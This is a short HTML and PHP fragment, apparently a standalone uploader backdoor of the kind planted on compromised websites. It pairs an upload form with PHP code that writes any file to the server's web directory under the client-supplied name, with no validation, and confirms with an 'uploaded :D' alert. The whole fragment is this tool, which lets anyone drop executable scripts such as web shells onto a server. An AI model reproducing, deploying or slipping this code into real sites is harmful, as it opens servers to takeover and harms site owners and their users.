<br /><br /><br /><br />
<center><br /><br /><br />
</form>
<FORM ENCTYPE="multipart/form-data" ACTION="" METHOD="POST">
Upload Files: <INPUT NAME="file" TYPE="file">
<INPUT TYPE="submit" name="up" VALUE="Send">
</FORM>
<center>
<?
if(move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"])){
echo "<script>alert('uploaded :D')</script>";
}
?>